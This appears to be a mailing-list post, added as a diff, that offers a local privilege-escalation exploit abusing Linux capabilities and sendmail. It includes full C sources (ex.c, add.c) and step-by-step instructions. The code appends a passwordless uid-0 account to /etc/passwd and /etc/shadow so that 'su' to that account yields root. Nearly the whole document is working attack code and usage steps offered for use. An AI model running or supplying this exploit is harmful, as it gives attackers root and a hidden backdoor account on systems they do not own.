@@ -1,0 +1,79 @@
+
+Hello all,
+
+Attached is a file with 2 sources, ex.c and add.c
+
+compile these 2 and create a file "mail":
+
+From: yomama@foobar.com
+To: localuser@localdomain.com
+Subject: foo
+bar
+.
+
+then create a .forward with:
+|/path/to/add
+
+then just do: ./ex < mail
+
+this should add a user yomama with uid/gid = 0 and without a password
+set
+a simple su - yomama should give you root.
+
+This exploit was written by me in a hurry, I hope there are no mistakes
+
+Greets
+
+Florian Heinz
+--------------C5AA82A7D9E47C75A576FD13
+Content-Type: text/plain; charset=us-ascii;
+ name="exploit.c"
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline;
+ filename="exploit.c"
+
+
+-- snip -- ex.c --
+  
+#include <linux/capability.h>
+
+int main (void) {
+   cap_user_header_t header;
+   cap_user_data_t data;
+   
+   header = malloc(8);
+   data = malloc(12);
+   
+   header->pid = 0;
+   header->version = _LINUX_CAPABILITY_VERSION;
+   
+   data->inheritable = data->effective = data->permitted = 0;
+   capset(header, data);
+
+   execlp("/usr/sbin/sendmail", "sendmail", "-t", NULL);
+}
+
+-- snap -- ex.c --
+
+-- snip -- add.c --
+
+#include <fcntl.h>
+
+int main (void) {
+   int fd;
+   char string[40];
+   
+   seteuid(0);
+   fd = open("/etc/passwd", O_APPEND|O_WRONLY);
+   strcpy(string, "yomama:x:0:0::/root:/bin/sh\n");
+   write(fd, string, strlen(string));
+   close(fd);
+   fd = open("/etc/shadow", O_APPEND|O_WRONLY);
+   strcpy(string, "yomama::11029:0:99999:7:::");
+   write(fd, string, strlen(string));
+   close(fd);
+   
+}
+
+-- snap -- add.c --
+
